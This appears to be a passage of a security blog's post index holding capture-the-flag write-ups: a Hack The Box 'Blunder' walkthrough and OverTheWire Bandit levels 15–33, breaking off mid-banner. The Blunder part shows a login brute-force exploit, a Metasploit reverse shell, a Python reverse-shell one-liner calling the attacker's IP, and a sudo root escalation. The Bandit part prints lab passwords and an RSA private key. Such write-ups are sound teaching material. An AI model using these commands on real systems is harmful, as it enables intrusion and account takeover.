/server-status (Status: 403) [Size: 277] /todo.txt (Status: 200) [Size: 118] ===============================================================Some of the interesting results we got are /admin,/install.php, robots.txt and todo.txt.install.php and robots.txt also has nothing useful, the admin page gives us a login form. It seems the webserver is running Bludit CMS, looking at the source code of the login page, we see that the version of the CMS might be 3.9.2. If we searched for the version we find that it is vulnerable to Authentication bruteforce bypass.Let’s download the Exploit and continue our enumeration.todo.txt has some notes, and we find a possible username fergus. Let’s now get a password list from the website using cewl and use the exploit we got to bruteforce the login.$ cewl -w pass.list http://10.10.10.191$ python3 exploit.py Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]$ python3 exploit.py -l http://10.10.10.191/admin/login.php -u ./name -p ./pass.list[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX[&lt;] Brute Force: Testing -&gt; fergus:the[*] Brute Force: Testing -&gt; fergus:Load[◢] Brute Force: Testing -&gt; fergus:Plugins[ ] Brute Force: Testing -&gt; fergus:andWe wait for a bit until the exploit finishes. After that, we should now have fergus’s passwordFootholdLet’s fire up Metasploit and search for bludit.msf6 &gt; search bluditMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/bludit_upload_images_exec 2019-09-07 excellent Yes Bludit Directory Traversal Image File Upload VulnerabilityMetasploit has a upload images exec exploit, let’s use that one, give it the required parameters, and run it.msf6 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschainbluditpass =&gt; RolandDeschainmsf6 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergusbludituser =&gt; fergusmsf6 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts 10.10.10.191rhosts =&gt; 10.10.10.191msf6 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost tun0lhost =&gt; tun0msf6 exploit(linux/http/bludit_upload_images_exec) &gt; run[*] Started reverse TCP handler on 10.10.17.90:4444[+] Logged in as: fergus[*] Retrieving UUID...[*] Uploading wlffGPKpej.png...[*] Uploading .htaccess...[*] Executing wlffGPKpej.png...[*] Sending stage (39282 bytes) to 10.10.10.191[+] Deleted .htaccess[*] Meterpreter session 1 opened (10.10.17.90:4444 -&gt; 10.10.10.191:32892 ) at 2022-02-01 13:09:03 -0500meterpreter &gt;Great, we have now access to the machine.Privilege EscalationLet’s first drop a shell.meterpreter &gt; shellProcess 3103 created.Channel 0 created.whoamiwww-dataSince this shell is not really functional, let’s get one by setting up a netcat listner on our machine and executing this command on the target machine. python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.10.10\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'. Note:don’t forget to change the ip address on the code to yours!┌──(sirius㉿kali)-[~]└─$ nc -lnvp 9001listening on [any] 9001 ...connect to [10.10.17.90] from (UNKNOWN) [10.10.10.191] 48274$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@blunder:$ export TERM=xtermexport TERM=xtermwww-data@blunder:$ ^Zzsh: suspended nc -lnvp 9001┌──(sirius㉿kali)-[~]└─$ stty raw -echo; fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 9001www-data@blunder:$HugoAs user www-data we can’t do much. Searching through directories and files of one of the bludit folders located in /var/www, we find a file that has Hugo’s password hash.&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;{ \"admin\": { \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823cxxxxxxxxxxx\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"}Let’s copy the hash to our machine and crack it. After cracking it, we can now change our current user to Hugo with su hugo and supply the password we managed to crack.rootNow that we have a password, let’s do some enumeration.hugo@blunder:~$ sudo -lPassword:Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hugo may run the following commands on blunder: (ALL, !root) /bin/bashhugo@blunder:~$We can execute /bin/bash as any user but not as root. There is a vulnerable version of sudo where we can execute arbitrary commands as root user even in cases where the root access is disallowed. Refer to this article for more information.So what we can do is execute sudo -u#-1 /bin/bash and become root.hugo@blunder:~$ sudo -u#-1 /bin/bashroot@blunder:/home/hugo# whoamirootThank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 25 -> Level 33", "url": "/posts/Bandit-25-33/", "categories": "OverTheWire, Bandit", "tags": "overthewire, linux, bandit, git", "date": "2022-02-15 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. In today’s episode, we will be doing Level 25 -&gt; Level 33 of Bandit from OverTheWire. Let’s connect to bandit25 and start.Level 25 -&gt; Level 26GoalLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.SolutionOn bandit25’s home directory, we see bandit26.sshkey which is bandit26’s ssh private key. When we try to login using that key, we get logged out afterbandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhostCould not create directory '/home/bandit25/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesLinux bandit.otw.local 5.4.8 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.orgWelcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org. For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/Connection to localhost closed.bandit25@bandit:~$We know that the shell for bandit26 is not /bin/bash, so let’s check what shell this user has by executing the following.bandit25@bandit:~$ cat /etc/passwd | grep -i bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextThe shell in /usr/bin/showtext, let’s see what this binary does.bandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0This binary set the value of the environmental variable TERM to linux, and then executes the command more with text.txt which is in bandit26’s home directory.According to the man page of more, the latter is a filter for paging through text one screenful at a time. Reading through the man page in the commands section, we can type v and get vim editor, and that will allow us to execute commands on the system.For that, we need to be in the command view of more first, to do that, let’s make our terminal small so that the program doesn’t just exit.Now we press the button “v” and we get vim editor, we can now put our terminal window to it’s normal size.The command we need to execute on vim is shell, this suppose to give us a shell, but when we run it, we get back into more, let’s check the value of shell by typing :set shell ? and hit enterWhen get back shell=/usr/bin/showtextNow we now why we got back to more after running shell. We need to set the value of shell to /bin/bash by running :set shell=/bin/bash and run :shell after that in order to get our shell.Level 26 -&gt; Level 27GoalGood job getting a shell! Now hurry and grab the password for bandit27!SolutionAfter the hard times trying to get a shell for bandit26, we now have one. Listing the content of bandit26’s home directory we see bandit27-do binary with suid permission, running it we get the syntax on how to use it, and just like level 19, running the binary with id we see that we ran it as bandit27. Let’s get the password for the next level.Level 27 -&gt; Level 28GoalThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.Clone the repository and find the password for the next level.SolutionLet’s create a directory in /tmp, move to it and clone the repository using git clone ssh://bandit27-git@localhost/home/bandit27-git/repoNavigating to repo we find a file named README, and it contains the password for the next level.password for the next level : 0ef186ac70e04ea33b4c1853d2526fa2Level28 -&gt; Level 29GoalThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.Clone the repository and find the password for the next level.SolutionThe same steps of the previous level apply here.Let’s navigate to repo and see what can we find.We found a README.md file but it doesn’t have the password. Since this is a git repository, let’s check the history of changes done to it, run the command git log inside the repo directory.The last commit has the description of “fix info leak”, That’s why we didn’t find the password, let’s now check the second commit which will likely be the one where readme file contained the password. We can do that by executing git show {hash}.The password for the next level : bbc96594b4e001778eee9975372716b2Level 29 -&gt; Level 30GoalThere is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.Clone the repository and find the password for the next level.SolutionLet’s clone the repository and investigate it. README file doesn’t have the password as expected, let’s see the logs.Checking the first commit, we don’t see any password. Let’s run git logs --all to see if there is any other commit we couldn’t see before.Indeed there are other commits. Let’s check the changes of each commit.The –oneline option used in the image above shows only a small part of the hash and the description for better view, and we can use the short version of the hash with git show to see the changes.The password for the next level : 5b90576bedb2cc04c86a9e924ce42fafLevel 30 -&gt; Level 31GoalThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.Clone the repository and find the password for the next level.SolutionLet’s clone the repository and check the logs.We only see one commit. Let’s check if there is any tags using git tag.Tags are ref’s that point to specific points in Git history, and it is usually used to capture a point in history that is used for marked version release. In our case, we found secret tag, let’s show it using git show secretThe password for the next level : 47e603bb428404d265f59c42920d81e5Level 31 -&gt; Level 32GoalThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.Clone the repository and find the password for the next level.SolutionAs always, let’s clone the repository and see what’s there.It seems that we need to create a file called key.txt that contains ‘May I come in?’ in it and push that file to the remote repository, so let’s create the file and push it.We couldn’t upload the file because there is a .gitignore file, which is a file that specifies intentionally untracked files that Git should ignore. Inside of the file there is .txt, which means it will ignore every .txt file.Let’s modify the file by removing *.txt, push it after that.We have successfully pushed the file and got the password.The password for the next level : 56a9bf19c63d650ce78e6ec0354ee45eLevel 32 -&gt; Level 33GoalAfter all this git stuff its time for another escape. Good luck!SolutionWhen we login, we get a unusual prompt, and we can’t execute linux commandsThe shell seems to convert every command we enter into uppercase. Let’s go back the bandit 31 and check what shell bandit32 use.bandit31@bandit:~$ cat /etc/passwd | grep bandit32bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershellIt uses a shell called uppershell.Let’s try tho understand how this shell works.When we run a command, let’s say for example whoami, we get the following:&gt;&gt; whoamish: 1: WHOAMI: not foundWe can see sh, which is what the program uses to execute commands, and after it we see a 1 and WHOAMI. We conclude from that error message that the program uses positional parameter to do it’s job. Read more about positional parameter in this articleWhat we need to do to get a shell is to invoke the first positional parameter - that happens to be sh- by typing the parameter for sh which is going to be $0By executing $0 we get an sh shell, we can get an appropriate shell by exporting the value of $SHELL to /bin/bash and calling it after that.We have finally finished the all the 33 levels of Bandit, so kudos for making it here, thank you for taking the time to read my writeup, hopefully you have learnt some new tricks along the way. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 20 -> Level 25", "url": "/posts/Bandit-20-25/", "categories": "OverTheWire, Bandit", "tags": "overthewire, linux, bandit", "date": "2022-02-13 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. In today’s episode, we will be doing Level 20 -&gt; Level 25 of Bandit from OverTheWire. Let’s connect to bandit20 and start.Level 20 -&gt; Level 21GoalThere is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).NOTE: Try connecting to your own network daemon to see if it works as you thinkSolutionSince we need to connect to a localhost port, i used nmap to scan all port in localhost, but nothing stands out. I fired up another ssh connection to bandit20 and did the following.Let’s break this down.On the right, set up a netcat listener on port 9000 that echo’s the password when we connect to it. On the left i used the binary to connect to our netcat listener on the same port. And with that, we succeed to get the password for next level gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr.Level 21 -&gt; Level 22GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.SolutionLet’s navigate to /etc/cron.d directory and see what’s there.bandit21@bandit:~$ cd /etc/cron.dbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit17_root cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvWe found a bunch of scripts, but the one we’re interested in called cronjob_bandit22 and it executes a script located in /usr/bin directory. Looking at the content of the script file we see that it writes the password of bandit22 into a file in /tmp directory, we can print the content of that file and get the password.bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLILevel 22 -&gt; Level 23GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.SolutionAs we did in the last level, we print the bandit23 cron job file and it tells us the file that being executed automatically, if we print the content of that file we see the following.bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget The first line of the script (#!/bin/bash) is called a Shebang, and is used to tell the operating system which interpreter to use to parse the rest of the file, in our case it’s bash. The second command (myname=$(whoami)), is executing the command whoami and save the output to a variable called myname The third command is what really interest us, what it does is it echos I am user $myname, hash it using md5sum, and removes any spaces left in the output, and uses the string left to name a file where it saves the password, so we can replace $myname with bandit23 and get the name of the file.bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit17_root cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 cronjob_bandit25_rootbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nbandit22@bandit:/etc/cron.d$Level 23 -&gt; Level 24GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…SolutionWe print the content of the file we saw being executed reguraly in /etc/cron.d/cronjob_bandit24.bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:/tmp/dir$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho \"Executing and deleting all scripts in /var/spool/$myname:\"for i in * .*;do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidoneSo what the script does is change directory to /var/spool/$myname and the $myname variable being bandit24, it then executes every hidden file located in that directory, and then deletes it all the hidden files after that.What we need to do is create a script that gives us bandit24’s password, save the script as a hidden file in /var/spool/bandit24 and wait for our script to get executed.The i solved this challenge was by first creating a directory in /tmp, and give that directory full permissions so bandit24 can write there.bandit23@bandit:~$ mkdir /tmp/dirbandit23@bandit:~$ chmod 777 /tmp/dirbandit23@bandit:~$ cd /tmp/dirbandit23@bandit:/tmp/dir$After that i proceeded to write the script, i first created a hidden file and write the command that are going to be executed.bandit23@bandit:/tmp/dir$ touch .script.shbandit23@bandit:/tmp/dir$ echo '#!/bin/bash' &gt; .script.shbandit23@bandit:/tmp/dir$ echo 'cat /etc/bandit_pass/bandit24 &gt; /tmp/dir/bandit24' &gt;&gt; .script.shbandit23@bandit:/tmp/dir$ chmod +x .script.shbandit23@bandit:/tmp/dir$ cat .script.sh#!/bin/bashcat /etc/bandit_pass/bandit24 &gt; /tmp/dir/bandit24bandit23@bandit:/tmp/dir$ cp .script.sh /var/spool/bandit24/In my case, i choose to write a simple bash script that reads the /etc/bandit_pass/bandit24 and saves the output to a file called bandit24** in the /tmp/dir we created earlier. I gave the file execution permission and copied it to */var/spool/bandit24 directory. We wait a bit and we should see our file bandit24 that contains the password in /tmp/dir directory.bandit23@bandit:/tmp/dir$ lsbandit24bandit23@bandit:/tmp/dir$ cat bandit24UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZLevel 24 -&gt; Level 25GoalA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.SolutionSo we need to generate a list of possible combinations, save them is a file and use that list to brute force the pincode.#!/bin/bashfor i in {0000..9999}; do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\" $i &gt;&gt; listdoneThat’s the script i will use to generate the list. I put that in a file and gave that file execution permissions so i can run it.bandit24@bandit:/tmp/dir$ cat script.sh#!/bin/bashfor i in {0000..9999}; do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\" $i &gt;&gt; listdonebandit24@bandit:/tmp/dir$ chmod +x script.shbandit24@bandit:/tmp/dir$ ./script.shbandit24@bandit:/tmp/dir$ lslist script.shNow if we check the list we generated, we’ll see the following.bandit24@bandit:/tmp/dir$ head listUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009We succeeded in creating a list, now let’s use that list to brute force the pincode.bandit24@bandit:/tmp/dir$ cat list | nc localhost 30002I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Wrong! Please enter the correct pincode. Try again.Wrong! Please enter the correct pincode. Try again...Wrong! Please enter the correct pincode. Try again.Wrong! Please enter the correct pincode. Try again.Correct!The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzGExiting.bandit24@bandit:/tmp/dir$Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 15 -> Level 20", "url": "/posts/Bandit-15-20/", "categories": "OverTheWire, Bandit", "tags": "overthewire, linux, bandit", "date": "2022-02-11 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. In today’s episode, we will be doing Level 15 -&gt; Level 20 of Bandit from OverTheWire. Let’s connect to bandit15 and start.Level 15 -&gt; Level 16GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.SolutionWe need to connect to localhost on the specified port using SSL encryption, so telnet will not work because is sends everything unencrypted.One of the commands we can use is openssl with subcommand s_client. If we read the description in the man page of this command it says: The s_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS.That’s great, so we can use this command to connect to a host using SSH encryption. We need to specify some option first. -quiet : This option inhibits printing of session and certificate information, cause our goal is to only to submit the password. -connect : This option specifies the host and optional port to connect to.Now our final command looks like this:openssl s_client -quiet -connect localhost:30001bandit15@bandit:~$ openssl s_client -quiet -connect localhost:30001depth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1BfMYroe26WYalil77FoDi9qh59eK5xNrCorrect!cluFn7wTiGryunymYOu4RcffSxQluehdLevel 16 -&gt; Level 17GoalThe credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.SolutionI first run netstat to see listening ports but it didn’t work. Next, i checked if nmap is installed and BINGO, it is. Running a scan with specifying port 31000 to 32000 gives the following.bandit16@bandit:~$ which nmap/usr/bin/nmapbandit16@bandit:~$ nmap -p31000-32000 localhostStarting Nmap 7.40 ( https://nmap.org ) at 2022-02-18 18:20 CETNmap scan report for localhost (127.0.0.1)Host is up (0.00026s latency).Not shown: 996 closed portsPORT STATE SERVICE31046/tcp open unknown31518/tcp open unknown31691/tcp open unknown31790/tcp open unknown31960/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 0.11 secondsbandit16@bandit:~$ nmap -sV -p31000-32000 localhostNot really helpful, Let’s run a service scan with -sV option.bandit16@bandit:~$ nmap -sV -p31000-32000 localhostStarting Nmap 7.40 ( https://nmap.org ) at 2022-02-18 18:20 CETStats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 0.00% doneNmap scan report for localhost (127.0.0.1)Host is up (0.00023s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION31046/tcp open echo31518/tcp open ssl/echo31691/tcp open echo31790/tcp open ssl/unknown31960/tcp open echo1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=2/18%Time=620FD570%P=x86_64-pc-linux-gSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cuSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20theSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20PleaSF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\xSF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20SF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20PleaseSF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"WSF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%rSF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cSF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20theSF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20PlSF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptionsSF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20passwordSF:\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 88.60 secondsGreat, we got our port. The ports that has echo as a service are the one that sends back whatever we give them, the only port that doesn’t and has SSH encryption is 31790bandit16@bandit:~$ openssl s_client -quiet -connect localhost:31790depth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1cluFn7wTiGryunymYOu4RcffSxQluehdCorrect!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----bandit16@bandit:~$Great, it worked, and we got a private ssh key, let’s copy it and put it in a file on our machine, give it the right permission and connect to bandit17 with it.┌──(sirius㉿kali)-[~] └─$ vim id_rsa ┌──(sirius㉿kali)-[~] └─$ chmod 600 id_rsa ┌──(sirius㉿kali)-[~] └─$ ssh -i id_rsa bandit17@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesLinux bandit.otw.local 5.4.8 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; 